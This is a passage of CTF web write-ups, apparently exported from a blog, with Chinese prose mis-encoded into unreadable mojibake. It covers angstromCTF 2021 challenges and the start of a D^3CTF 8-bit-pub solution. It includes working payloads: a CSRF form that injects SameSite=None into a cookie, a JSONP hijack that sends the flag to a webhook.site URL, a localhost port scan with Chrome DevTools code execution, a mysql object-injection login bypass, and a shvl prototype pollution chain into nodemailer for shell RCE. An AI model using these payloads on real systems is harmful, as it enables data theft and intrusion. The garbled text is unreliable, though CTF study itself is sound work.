ä¸ºå…¶httpåº“åœ¨è¿™åŸºç¡€ä¸Šæ²¡æœ‰è¿‡æ»¤æ‰\\r\\nã€‚ç›´æ¥å¯¼è‡´CRLFã€‚ jasonCSRFã€‚ æºç å…³é”®éƒ¨åˆ†å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334function sameOrigin (req, res, next) &#123; if (req.get('referer') &amp;&amp; !req.get('referer').startsWith(process.env.URL)) return res.sendStatus(403) return next()&#125;app.post('/passcode', function (req, res) &#123; if (req.body.passcode === 'CLEAR') res.append('Set-Cookie', 'passcode=') else res.append('Set-Cookie', `passcode=$&#123;(req.cookies.passcode || '')+req.body.passcode&#125;`) return res.redirect('/')&#125;)app.post('/visit', async function (req, res) &#123; if (req.body.site.startsWith('http')) try &#123;await jason.visit(req.body.site) &#125; catch (e) &#123;console.log(e)&#125; return res.redirect('/')&#125;)app.get('/languages', sameOrigin, function (req, res) &#123; res.jsonp(&#123;category: 'languages', items: ['C++', 'Rust', 'OCaml', 'Lisp', 'Physical touch']&#125;)&#125;)app.get('/friends', sameOrigin, function (req, res) &#123; res.jsonp(&#123;category: 'friends', items: ['Functional programming']&#125;)&#125;)app.get('/flags', sameOrigin, function (req, res) &#123; console.log(req.cookies); if (req.cookies.passcode !== process.env.PASSCODE) return res.sendStatus(403) res.jsonp(&#123;category: 'flags', items: [process.env.FLAG]&#125;)&#125;)app.listen(7331) å…¶ä¸­visitéƒ¨åˆ†æ˜¯ä¸ª puppeteer çš„botè®¿é—®ã€‚ é¦–å…ˆå¾ˆæ˜æ˜¾ã€‚flagåœ¨jsonpå¤„ã€‚ç†è®ºä¸Šè·å¾—jsonpè¿”å›å€¼å³å¯ã€‚ä½†æ˜¯å®ƒä½œäº†refererçš„æ£€æŸ¥ã€‚è¿™ä¸ªå€’æ˜¯æŒºå¥½ç»•ã€‚å› ä¸ºå®ƒåªè€ƒè™‘äº†æœ‰refererçš„æƒ…å†µä¸‹éœ€è¦ä»å®ƒçš„ä¸»ç«™æ¥ã€‚æ‰€ä»¥ä¸å¸¦refererå³å¯ã€‚ ä½†æ˜¯ï¼Œæ­¤å¤„æˆ‘ä»¬æƒ³å¤–å¸¦dataå¿…ç„¶è¦åŠ«æŒjsonpã€‚ä¹Ÿå°±æ˜¯è¦è®©å…¶è¿”å›å†…å®¹ä½œä¸ºé¡µé¢ä¸‹çš„å¯æ§javascriptã€‚æ‰€ä»¥å¾—ç”¨scriptæ¥è·¨åŸŸåŠ è½½ã€‚ (ç°åœ¨chromeçš„CORBé˜²èŒƒçœŸçš„éå¸¸ä¸¥æ ¼ï¼Œscriptåªä¼šè·¨åŸŸåŠ è½½ text/javascriptçš„èµ„æº,ä¸è¿‡è¿˜å¥½jsonpæœ¬èº«å°±æ˜¯ç§è·¨åŸŸæ–¹å¼) 1234const script = document.createElement('script');script.referrerpolicy = 'no-referrer'script.src = \"http://127.0.0.1:7331/flags?callback=load\"document.head.appendChild(script) è·å¾—jsonpçš„æ–¹æ³•æ˜ç™½äº†ä¹‹åè¿˜æœ‰ä¸€ç‚¹æ³¨æ„ï¼Œæˆ‘ä»¬éœ€è¦adminå¸¦cookieè®¿é—®æ‰èƒ½è·å¾—flagsçš„jsonpå†…å®¹ã€‚ç„¶è€Œè¿™é‡Œæ˜¯express è‡ªå¸¦çš„jsonpè€Œä¸æ˜¯é‚£ç§phpè‡ªå†™çš„jsonpã€‚å…¶callbackå¹¶ä¸èƒ½åšåˆ°ä»»æ„å­—ç¬¦,ä¹Ÿå°±æ²¡æœ‰xssäº†ã€‚æ‰€ä»¥è¿™ä¸ªç«™å¹¶æ²¡æœ‰xssåˆ©ç”¨æ¥è·å–domçš„å†…å®¹ æ‰€ä»¥ã€‚å•çº¯åˆ©ç”¨csrfæ€ä¹ˆæ‰èƒ½æœ‰æƒè®¿é—®jsonpå‘¢ï¼Ÿè¿™é‡Œå¦‚æœæ³¨æ„åˆ°passcodeçš„å¥‡æ€ªå†™æ³•ï¼Œæ–¹æ³•å°±æ°´è½çŸ³å‡ºäº†ã€‚ 1res.append('Set-Cookie', `passcode=$&#123;(req.cookies.passcode || '')+req.body.passcode&#125;`) æ­¤å¤„passcodeå®Œå…¨å¯æ§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨set-cookieåŸæœ¬çš„cookieååŠ å…¥ä»»æ„å†…å®¹ã€‚è¦åŠ ä»€ä¹ˆï¼Œæˆ–è€…è¯´èƒ½åŠ ä»€ä¹ˆï¼ŒMDNå†™çš„æ˜¯å¾ˆæ¸…æ¥šçš„ cookieçš„å‡ ä¸ªå®‰å…¨å±æ€§ä¸­ã€‚httpOnlyä¸SameSite æ˜¯ç”¨çš„éå¸¸å¤šçš„ã€‚å…¶ä¸­httpOnlyå¯ä»¥é˜²æ­¢é€šè¿‡domè·å–cookie.SameSiteåˆ™æŒ‡å®šcookieçš„ä½œç”¨åŸŸã€‚å°¤å…¶åœ¨è·¨åŸŸè¯·æ±‚ä¸Šä½œç”¨å¾ˆå¤§ã€‚(å¦‚æœsamesite ä¸ºnone, å³ä½¿æ˜¯csrfä¹Ÿå¯ä»¥åˆ©ç”¨è·¨åŸŸè¯·æ±‚è¿›è¡Œxsleak) ä¸€èˆ¬æ¥è¯´æ²¡æœ‰è®¾ç½®SameSite çš„è¯ï¼Œé»˜è®¤æ˜¯ä¸ºLaxçš„ã€‚ä¹Ÿå°±æ˜¯é»˜è®¤é˜²csrf.æ‰€ä»¥è¿™é‡Œç›´æ¥åˆ©ç”¨passcode è®¾ç½®ä¸ºNoneå³å¯ã€‚ æ³¨æ„çš„æ˜¯ã€‚ç°åœ¨SameSite ä¸ºNone.æ—¶ï¼Œå¿…é¡»è®¾ç½®Secureä¸ºtrue,ä¹Ÿå°±æ˜¯å¿…é¡»åœ¨httpsä¸Š(é™¤äº†localhost)æ‰æœ‰æ•ˆã€‚ è¿™é‡Œç®€å•å†™ä¸ªè¡¨å•æäº¤(å…¶ä»–è¯·æ±‚å¦‚fetchä¸ä¼šé¡ºç€è·³è½¬ã€‚è¿™æ ·set-cookie å°±æ²¡æ„ä¹‰äº†ã€‚)ã€‚æˆ‘ä»¬åœ¨æœ¬é¡µé¢å¼€ä¸ªæ–°çª—å£æ‰§è¡Œè¡¨å•åä¸€ç›´è°ƒç”¨ location.reload()åˆ·æ–°æœ¬é¡µé¢ã€‚è¿™æ ·ç­‰cookieåœ¨æˆ‘ä»¬çš„æ¶æ„htmlå¤„ç”Ÿæ•ˆæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¢«åŠ«æŒçš„loadäº†ã€‚è¿™é‡Œå¯ä»¥fetchè¯·æ±‚ä¸‹è‡ªå·±çš„ç«™å¤–å¸¦æ•°æ®ï¼Œä¹Ÿå¯ä»¥navigator.sendBeacon postæ•°æ® è¿™é‡Œå› ä¸ºä»–è¿œç¨‹çš„puppeteer æ²¡æœ‰timeout.æ‰€ä»¥æœ€å¥½æŠŠinterValçš„é—´éš”è®¾çŸ­ç‚¹ã€‚ 1234567891011121314&lt;script&gt; const script = document.createElement('script'); script.referrerpolicy = 'no-referrer' script.src = \"http://127.0.0.1:7331/flags?callback=load\" document.head.appendChild(script) const load = (data) =&gt; &#123; navigator.sendBeacon('https://webhook.site/48cbda29-080e-442f-8040-7a52a9093234', window.btoa(data)) &#125; w = window.open('poc2.html') setInterval(() =&gt; &#123; location.reload() &#125;, 100)&lt;/script&gt; 1234&lt;form action=\"http://127.0.0.1:7331/passcode\" method=\"post\" id=\"form\"&gt; &lt;input type=\"hidden\" name=\"passcode\" value=\"; SameSite=None; Secure\"&gt;&lt;/form&gt;&lt;script&gt;form.submit()&lt;/script&gt; åæ¥çœ‹äº†å®˜æ–¹é¢˜è§£ã€‚åŸºæœ¬æ˜¯ä¸€è‡´çš„ã€‚ä¸è¿‡ä»–ç”¨localStorage.done = trueä¹Ÿå°±æ˜¯localStorageæ¥å­˜äº†ä¸ªæ ‡è®°å˜é‡ã€‚è¿™æ ·çš„è¯ä¿è¯åªä¼šåœ¨è¡¨å•æäº¤å¥½ï¼Œå¹¶ä¸”è·³è½¬å®Œåæ‰reload. 1234setInterval(function () &#123; try &#123; w.location.href &#125; catch (e) &#123; localStorage.done = true; location.reload() &#125; &#125;, 10) actf{jason&#39;s_site_isn&#39;t_so_lax_after_all} Spoofyè¿™é¢˜æ²¡åšã€‚ã€‚ã€‚ä½†æ˜¯è§£å‡ºäººæ•°æŒºå¤šçš„ã€‚åæ¥å‘ç°å¯èƒ½æ˜¯é”™è¿‡äº†ä¸€ç¯‡æ–‡ç«  https://jetmind.github.io/2016/03/31/heroku-forwarded.html ç®€å•çš„è¯´ã€‚å°±æ˜¯herokuå¯èƒ½ä¼šæŠŠçœŸå®ip appendåˆ°x-forwarded-for åã€‚å‡å¦‚ä¼ çš„æ—¶å€™å¸¦äº†ä¸¤ä¸ªxffã€‚å°±å¯èƒ½ä¼šè§£ææˆ 1&#123;&quot;x-forwarded-for&quot; &quot;10.10.10.10,99.99.99.99,20.20.20.20&quot;&#125; å…¶ä¸­ 99.99.99.99 æ˜¯è¢«åŠ è¿›å»çš„çœŸå®ipã€‚æœ¬é¢˜æºç éƒ¨åˆ†åªè¦æ±‚xff é‡Œ, åˆ†å‰²åçš„ipé‡Œã€‚ç¬¬ä¸€ä¸ªä¸æœ€åä¸€ä¸ªç›¸åŒä¸”ä¸º1.3.3.7ã€‚æ‰€ä»¥åŠ ä¸ªé€—å·å³å¯ 12X-Forwarded-For: 1.3.3.7X-Forwarded-For: , 1.3.3.7 Watered Down Watermark as a Serviceè¿™é¢˜å› ä¸ºæ²¡æ—¶é—´å°±æ²¡çœ‹ã€‚ä½†æ˜¯è®°å¾—é¢˜ç›®ååœ¨diceCTFé‡Œå‡ºç°è¿‡ã€‚åæ¥èµ›åå‘ç°diceCTFçš„éé¢„æœŸåœ¨è¿™é‡Œè¿˜æœ‰ã€‚å½“æ—¶åœ¨discordé‡Œè§åˆ°æœ‰å¸ˆå‚…æåˆ°ç”¨chromeçš„devtools portåšçš„ã€‚å°è±¡è¿˜å¾ˆæ·±åˆ»ã€‚ä¸€æ–¹é¢ï¼ŒbyteCTF çº¿ä¸‹å†³èµ›æœ‰ä¸ªmarkdownxss, å¥½åƒæ˜¯æ‰¾æµè§ˆå™¨0day xss åå†åˆ©ç”¨chrome çš„devtools port æ¥ç€ã€‚å¦ä¸€æ–¹é¢æˆ‘è‡ªå·±å†™seleniumçˆ¬è™«æ—¶å‘ç°å¦‚æœè°ƒç”¨çš„æ˜¯selenium-webdriver/chrome ä¹Ÿå°±æ˜¯è‡ªå·±åº“é‡Œçš„chromeè€Œä¸æ˜¯æœ¬æœºçš„chromeæ—¶ï¼Œä¼šè‡ªåŠ¨å¼€ä¸ªdevtools ç«¯å£æ¥è°ƒè¯•ã€‚æ­¤é¢˜ç”¨åˆ°çš„puppeteerä¹Ÿæ˜¯ä¸€æ · é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯æ‰¾åˆ°devtools çš„ç«¯å£ã€‚ç”±äºå¯ä»¥é€šè¿‡http è®¿é—®ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦å°èŒƒå›´çˆ†ç ´å³å¯ã€‚æ³¨æ„æºç çš„é™åˆ¶ 1234567891011121314151617181920212223app.use((req, res, next) =&gt; &#123; res.set('X-Frame-Options', 'deny'); res.set('X-Content-Type-Options', 'nosniff'); next()&#125;)...async function visit (url) &#123; if (!checkURL(url)) return 'no!!!!' let ctx = await (await browser).createIncognitoBrowserContext() let page = await ctx.newPage() page.on('framenavigated',function(frame)&#123; if (!checkURL(frame.url())) return 'no!!!!' &#125;) ......function checkURL(url) &#123; const urlobj = new URL(url) if(!urlobj.protocol || !['http:','https:'].some(x=&gt;urlobj.protocol.includes(x)) || urlobj.hostname.includes(\"actf.co\")) return false return true&#125; ä¸€æ–¹é¢é™åˆ¶äº†iframeã€‚( å¦‚æœé¡µé¢åŠ è½½å¤±è´¥ã€‚å®ƒä¼šå®šå‘åˆ°chrome://network-error/ã€‚è€Œè¿™ä¸ªå°±æ²¡æ³•åˆ¤æ–­äº†)ã€‚åŒæ—¶ä¹Ÿç”¨X-Content-Type-Optionsé™åˆ¶äº†script.ä¸èƒ½scriptè·¨åŸŸåŠ è½½ã€‚ æ‰€ä»¥æ­¤å¤„æˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–è·¨åŸŸè¯·æ±‚æ–¹æ³•ã€‚fetch + no-corså³å¯ã€‚ 1234567891011121314&lt;html&gt;&lt;head&gt;byc&lt;/head&gt;&lt;body&gt;&lt;script&gt;for (let port = 40000; port &lt; 45000; port++) &#123; const url = `http://127.0.0.1:$&#123;port&#125;` fetch(url, &#123;mode: 'no-cors'&#125;).then(res =&gt; &#123; document.body.innerHTML += `\\n$&#123;url&#125;` &#125;)&#125;&lt;/script&gt; &lt;link rel=\"stylesheet\" href=\"http://difajosdifjwioenriqoewrowifjaoijdaf.com\"&gt; &lt;/body&gt; &lt;/html&gt; ä¹‹åæˆ‘ä»¬è®¿é—®å…¶json/newè·¯ç”±ã€‚ä»–ä¼š Opens a new tab. Responds with the websocket target data for the new tab. è¿™æ ·å°±ä¼šæ–°å¼€ä¸€ä¸ªæ ‡ç­¾é¡µã€‚ä¸”æˆ‘ä»¬èƒ½æ‰§è¡Œä»»æ„js.ä¸ºäº†è·å–flagè‡ªç„¶æ˜¯http://127.0.0.1:40027/json/new?file:///app/flag.txt æ¥ç”¨æµè§ˆå™¨æ‰“å¼€flag æ ¹æ® https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate æˆ‘ä»¬å¯ä»¥ç”¨Runtime.evaluate æ¥æ‰§è¡Œä»»æ„js 123456789window.ws = new WebSocket(`ws://127.0.0.1:40027/devtools/page/98D1EC60387BE0038D514389E2887339 `)ws.onmessage = (e =&gt; &#123; document.writeln(\"&lt;h3&gt;\" + e.data + \"&lt;/h3&gt;\"); &#125;)ws.onopen = () =&gt; &#123; ws.send(JSON.stringify(&#123; id: 1, method: 'Runtime.evaluate', params: &#123; expression: 'document.body.innerHTML' &#125; &#125;))&#125; è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šçš„ã€‚é¢„æœŸå¥½åƒæ˜¯æ„é€ BSON æ•°æ®ã€‚æ„Ÿè§‰è·Ÿwebå…³ç³»ä¸å¤§ã€‚ã€‚ã€‚ Summary æ€»çš„æ¥è¯´é¢˜ç›®è´¨é‡éƒ½å¾ˆä¸é”™ã€‚å¾ˆéš¾æƒ³è±¡æ˜¯ç»™é«˜ä¸­ç”Ÿå‡†å¤‡çš„é¢˜ã€‚ã€‚ã€‚å…³äºå‰ç«¯çš„ä¸€äº›çŸ¥è¯†è‡ªå·±ä¹Ÿæœ‰äº†ä¸€äº›æ–°çš„è§è§£ã€‚å¸Œæœ›èƒ½æœ‰æœºä¼šæ€»ç»“ä¸‹ã€‚ Referenceshttps://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"D^3CTF 8-bit-pub","slug":"D^3CTF-8-bit-pub","date":"2021-03-06T14:37:32.000Z","updated":"2021-03-08T11:29:35.095Z","comments":true,"path":"2021/03/06/D^3CTF-8-bit-pub/","link":"","permalink":"https://www.bycsec.top/2021/03/06/D^3CTF-8-bit-pub/","excerpt":"å‘¨æœ«è¿›è¡Œçš„d^3CTFåŸæœ¬è‡ªå·±æ˜¯æ²¡å‚åŠ çš„ã€‚ä¸è¿‡å› ä¸ºè¢«é—®åˆ°äº†å…¶ä¸­ä¸€é“é¢˜ç›®æ‰€ä»¥å°±åšäº†ä¸‹, å¤§æ¦‚èŠ±äº†2ä¸ªå°æ—¶ã€‚é¢˜ç›®éš¾åº¦è™½ç„¶ä¸­ç­‰ï¼Œä¸è¿‡ä¸ªäººè®¤ä¸ºå…¶åˆ©ç”¨é“¾çš„ç»„æˆéƒ½æ˜¯æ¯”è¾ƒç»å…¸çš„æ¼æ´ã€‚è¿™é‡Œåˆ†äº«ä¸‹è‡ªå·±çš„åšé¢˜æ€è·¯","text":"å‘¨æœ«è¿›è¡Œçš„d^3CTFåŸæœ¬è‡ªå·±æ˜¯æ²¡å‚åŠ çš„ã€‚ä¸è¿‡å› ä¸ºè¢«é—®åˆ°äº†å…¶ä¸­ä¸€é“é¢˜ç›®æ‰€ä»¥å°±åšäº†ä¸‹, å¤§æ¦‚èŠ±äº†2ä¸ªå°æ—¶ã€‚é¢˜ç›®éš¾åº¦è™½ç„¶ä¸­ç­‰ï¼Œä¸è¿‡ä¸ªäººè®¤ä¸ºå…¶åˆ©ç”¨é“¾çš„ç»„æˆéƒ½æ˜¯æ¯”è¾ƒç»å…¸çš„æ¼æ´ã€‚è¿™é‡Œåˆ†äº«ä¸‹è‡ªå·±çš„åšé¢˜æ€è·¯ analysisé¦–å…ˆæ‹¿åˆ°æºç åˆ†æä¸‹ã€‚å¹¶ä¸åƒç®€å•çš„nodejsé¢˜ç›®å­˜åœ¨æ˜¾çœ¼çš„æ¼æ´åˆ©ç”¨ç‚¹ã€‚ä½†æ˜¯æœ‰ä¸€äº›åœ°æ–¹æ˜¯æ‹¥æœ‰express å¼€å‘ç»éªŒçš„å°ä¼™ä¼´ç»ä¸èƒ½ç–å¿½æ‰çš„ è¿™é‡Œç”¨çš„æ˜¯æ²¡æœ‰å±•å¼€çš„postæ•°æ®ä¸­é—´ä»¶ä¸jsonä¸­é—´ä»¶ã€‚è¿™æ„å‘³ç€å½“æˆ‘ä»¬å‘é€jsonæ•°æ®æ—¶,å¯ä»¥ä¼ å…¥æ•°ç»„/å¯¹è±¡ã€‚ æˆ‘ä»¬æ¥ä¸‹æ¥ç»§ç»­çœ‹é¢˜ç›®æ€è·¯ã€‚ è®¿é—®adminè·¯ç”±éœ€è¦req.session.username ä¸º admin. ä¹‹ååœ¨adminè·¯ç”±å¤„è°ƒç”¨äº†ä¸€ä¸ªéå¸¸æ˜¾çœ¼çš„èµ‹å€¼æ“ä½œã€‚æœ€åå°†æˆ‘ä»¬çš„æ•°æ®é€šè¿‡nodemailerä¸­çš„sendMailå‘é€é‚®ä»¶ã€‚ æ—¢ç„¶éœ€è¦session ä¸ºadmin , æˆ‘ä»¬å°±è¦ä½œä¸ºadmin ç™»å½•ã€‚æˆ‘ä»¬æ¥çœ‹ç™»å½•sqlè¯­å¥çš„æ“ä½œã€‚ 123sql.query(\"SELECT * FROM users WHERE username = ? AND password = ?\",[username, password],function (err, res) &#123; ......&#125; å¾ˆå¥‡æ€ªã€‚è™½ç„¶æ²¡æœ‰å­—ç¬¦æ‹¼æ¥,ä½†ä¹Ÿæ²¡æœ‰ç”¨å¸¸è§„çš„å ä½ç¬¦å¤„ç†ã€‚ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚æˆ‘ä»¬æ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯¹è¿™ç§æƒ…å†µçš„å¤„ç†ã€‚ å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ç§è½¬ä¹‰å­—ç¬¦çš„ç”¨æ³•ã€‚ä½†æ˜¯æ³¨æ„æ­¤å¤„å¹¶æ²¡æœ‰é™åˆ¶ä¼ å…¥å‚æ•°åªèƒ½ä¸ºå­—ç¬¦ã€‚è¿˜è®°å¾—ä¸Šé¢jsonä¸­é—´ä»¶çš„å­˜åœ¨å—ï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥ç›´æ¥ä¼ å…¥å¯¹è±¡/æ•°ç»„,è€Œmysqlä¾èµ–å¯¹äºè¿™ç§æƒ…å†µçš„å¤„ç†æ˜¯å–œé—»ä¹è§çš„ï¼š æ­¤å¤„çš„é”®å€¼ä¼šè¢«å±•å¼€ï¼Œé‚£æˆ‘ä»¬è‡ªç„¶å¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªçœŸå€¼çš„ç™»å½•è¯­å¥ 1SELECT * FROM users WHERE username = 'admin' AND password = `password` =1 çœ‹åˆ°ç™»å½•è·¯ç”±å¹¶æ²¡æœ‰è¯­å¥åˆ¤æ–­ä¼ å…¥å‚æ•°æ˜¯å¦åªä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨{&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;: {&quot;password&quot;: &quot;1&quot;}} æˆåŠŸç™»å½•,æ¥åˆ°adminè·¯ç”±ã€‚ ps: ä¹‹å‰å‡ºNCTF çš„nosqlæ³¨å…¥æ—¶å°±æ›¾å¼ºè°ƒè¿‡,ä¼ å‚ä¸€å®šè¦æ£€æŸ¥ç±»å‹ã€‚è¿™ä¸¤å¤„éƒ½æ˜¯å› ä¸ºå…è®¸jsonæ•°æ®ä¼ å…¥å¯¹è±¡å¯¼è‡´æ³¨å…¥çš„å…¸å‹ã€‚ä¹Ÿæ˜¯è€åˆ°æ‰ç‰™çš„é—®é¢˜äº†ã€‚ prototype pollution to RCE æ¥ä¸‹æ¥æˆ‘æŠŠé‡å¿ƒæ”¾åœ¨adminæ§åˆ¶å™¨é‚£éå¸¸æ˜¾çœ¼çš„ä»£ç é‚£ï¼Œ 123456let contents = &#123;&#125;;Object.keys(req.body).forEach((key) =&gt; &#123; shvl.set(contents, key, req.body[key]);&#125;);contents.from = '\"admin\" &lt;admin@8-bit.pub&gt;'; ç†Ÿæ‚‰node æ¼æ´çš„åº”è¯¥ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥è¿™é‡Œå¯èƒ½å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚ï¼ˆä¸ç›´æ¥ä¼ å€¼éè¦éå†å¯æ§jsonæ•°æ®çš„keys,å¤ªæ˜æ˜¾äº†ã€‚ã€‚ã€‚ï¼‰ ä¸Šgithubæœç´¢ä¸‹shvlä¼šå‘ç°è¿™æ˜¯ä¸€ä¸ªstar è¿100éƒ½ä¸åˆ°çš„ä¾èµ–ã€‚å¦‚æœå…³æ³¨è¿‡hackeroneä¸Šnode ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´çš„è¯ï¼Œå°±ä¼šç•™æ„åˆ°ä¸Šé¢æœ‰å¾ˆå¤šéå¸¸å†·é—¨çš„ä¾èµ–çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¿™äº›ä¾èµ–å¤§å¤šä½¿ç”¨é‡å°‘ï¼Œä»¥è‡³äºå¼€å‘è€…æœ‰æ—¶ä¹Ÿæ‡’å¾—ä¿®ã€‚å®˜æ–¹ä¹Ÿä¸ä¼šæ³¨é‡å…¶å®‰å…¨æ€§(æ‰€ä»¥å¼€å‘ä¸­è¿˜æ˜¯ç”¨ä½¿ç”¨é‡å¤šçš„ä¾èµ–2333) æŒ‰ç…§è¿™ä¸ªæ€è·¯æœç´¢shvl prototype pollutionä¸éš¾å‘ç° https://snyk.io/vuln/SNYK-JS-SHVL-1054936 çš„ç¡®å­˜åœ¨æ±¡æŸ“æ¼æ´ã€‚ä¸è¿‡è²Œä¼¼ç°åœ¨ç‰ˆæœ¬å·²ç»ä¿®å¤äº†ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ä¿®å¤ä»£ç  12345export function set (object, path, val, obj) &#123; return !/__proto__/.test(path) &amp;&amp; ((path = path.split ? path.split('.') : path.slice(0)).slice(0, -1).reduce(function (obj, p) &#123; return obj[p] = obj[p] || &#123;&#125;; &#125;, obj = object)[path.pop()] = val), object;&#125;; æ­¤å¤„æ¯”è¾ƒå°´å°¬çš„æ˜¯ï¼Œä½œè€…ä¿®å¤çš„æ–¹å¼åªæ˜¯å•çº¯çš„æ£€æŸ¥ path æ˜¯å¦å«__proto__. ç„¶è€Œå®ƒèµ‹å€¼çš„æ–¹æ³•æ˜¯é€šè¿‡å¾ªç¯å¯¹è±¡èµ‹å€¼çš„ã€‚ç»•è¿‡æ–¹æ³•å¤ªå¸¸è§äº†ã€‚constructor.prototypeå³å¯ poc 12345678910111213const shvl = require('shvl'); var obj = &#123;&#125; console.log(\"Before : \" + obj.isAdmin); shvl.set(obj, 'constructor.prototype.isAdmin', true);console.log(\"After : \" + obj.isAdmin);console.log(Object.prototype);/*Before : undefinedAfter : true[Object: null prototype] &#123; isAdmin: true &#125;*/ è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ±¡æŸ“åˆ°åŸºç±»åŸå‹çš„ä»»æ„å±æ€§ä¸Šäº†,è¿™å¯ä»¥ç®—æ˜¯éå¸¸å¼ºå¤§çš„ã€‚å‡å¦‚é¢˜ç›®ç”¨äº†æ¨¡æ¿å¼•æ“åŸºæœ¬ä¸Šå°±ç»“æŸç›´æ¥RCEäº†ã€‚ä¸è¿‡æ˜¾ç„¶ï¼Œé¢˜ç›®çš„nodemailerè¿˜æ²¡æœ‰ç”¨åˆ°ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹nodemailerçš„å†å²æ¼æ´ å¾ˆå¿«æˆ‘ä»¬å°±èƒ½æ‰¾åˆ°https://snyk.io/vuln/SNYK-JS-NODEMAILER-1038834è¿™é‡Œçš„å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚æ¥çœ‹ä¸‹å…³é”®ä»£ç  nodemailer\\lib\\sendmail-transport\\index.jsä¸­ , SendmailTransport ç±»çš„send æ–¹æ³• è¿™é‡Œå‘½ä»¤æ³¨å…¥çš„åŸç†æ˜¯ï¼Œargså‚æ•°-iä¸é»˜è®¤ä¸ºç©ºçš„this.argsä¸å¯æ§çš„envelope.toæ‹¼æ¥äº†ã€‚è¿™å°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥é¢å¤–å¡å…¥å…¶ä»–å‚æ•°ã€‚åšåˆ°å‚æ•°æ³¨å…¥,åƒ-Dfilename@example.com (Debug output ffile) ç„¶å,ä¸‹é¢è°ƒç”¨äº†ä¸€ä¸ª_spawn,å…¶å®å°±æ˜¯spawn(sendmail,args)ã€‚å¦‚æœè¯´phpé‡Œå¤§å®¶æœ€å…ˆä¼šå»æ‰¾çš„æ¶æ„å‡½æ•°æ˜¯system,execç­‰oså‡½æ•°ï¼Œnodejsä¸­ç›¸å¯¹åº”çš„è‚¯å®šå°±æ˜¯spawn,execSyncè¿™æ ·çš„äº†(å…¶å®éƒ½æ˜¯è°ƒç”¨çš„spawn),æ›´ä¸ç”¨è¯´,åŸºç±»æ±¡æŸ“ + child_process = RCE. æ—¢ç„¶è¿™é‡Œæœ‰å­è¿›ç¨‹å‡½æ•°ã€‚æˆ‘ä»¬åˆæœ‰ä»»æ„é“¾ä¸Šçš„æ±¡æŸ“,è¿™æ ·å°±æœ‰ä¸¤ç§æ–¹å¼RCEäº†ã€‚ä¸€ä¸ªæœ´ç´ çš„æƒ³æ³•å°±æ˜¯ç®€å•æ£€æŸ¥ä¸‹çœ‹çœ‹å…¶å­è¿›ç¨‹å‡½æ•°å‚æ•°æ˜¯å¦å¯æ§ã€‚ åˆ†äº«ä¸€ä¸ªéå¸¸å¸¸è§çš„å°æŠ€å·§ï¼Œè¦çŸ¥é“è¿™ä¸ªå±æ€§æ˜¯ä¸æ˜¯ä¼šå—åˆ°é“¾ä¸Šæ±¡æŸ“çš„å½±å“ï¼Œç›´æ¥çœ‹ä»£ç ç»“æ„å°±å¥½äº† åŸºæœ¬ä¸Šå‡ºç°if(xxx.xxx)è¿™æ ·è¯­å¥çš„,å®ƒç”¨æ¥åˆ¤æ–­çš„å±æ€§å¤šåŠæ˜¯æ²¡æœ‰é¢„å…ˆèµ‹å€¼çš„ã€‚æ‰€ä»¥æ‰ä¼šé€šè¿‡ifæ¥åˆ¤æ–­æ˜¯å¦æœ‰å€¼,æ¥å†™æ¡ä»¶è¯­å¥ã€‚è€Œè¿™äº›å±æ€§åŸºæœ¬éƒ½æ˜¯å¯æ±¡æŸ“çš„ã€‚æ­£å› å¦‚æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åšåˆ°æ±¡æŸ“options.args ä¸options.path.ç­‰äºæ˜¯å®Œå…¨æ§åˆ¶äº†spawnçš„å‚æ•°ã€‚ spawnçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯command,ç¬¬äºŒä¸ªæ˜¯æ•°ç»„æ¥æ”¶ command-line argumentsã€‚æˆ‘ä»¬å¯ä»¥ç”¨/bin/sh -c &quot;xxx&quot;æ‰§è¡Œä»»æ„å‘½ä»¤ é‚£ä¹ˆé¢˜ç›®ä¸­çš„sendmailä¼šä¸ä¼šé»˜è®¤èµ°åˆ°è¿™é‡Œå‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä¸‹mail.jsä¸­nodemailer.createTransportçš„ä»£ç  æ˜¾ç„¶éœ€è¦optionsä¸­è®¾ç½® sendmail ä¸ºtrue,æˆ‘ä»¬çš„transporteræ‰ä¼šæ˜¯SendmailTransport. è¿™é‡Œè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„é“ç†ï¼Œæˆ‘ä»¬ç›´æ¥æ±¡æŸ“ sendmail å±æ€§å³å¯ æ¥ä¸‹æ¥å°±å¾ˆè½»æ¾äº† exploit æ–¹ä¾¿è°ƒè¯•èµ·è§ï¼Œæˆ‘ä»¬å…ˆæœ¬åœ°èµ·ä¸€ä¸‹ä»£ç 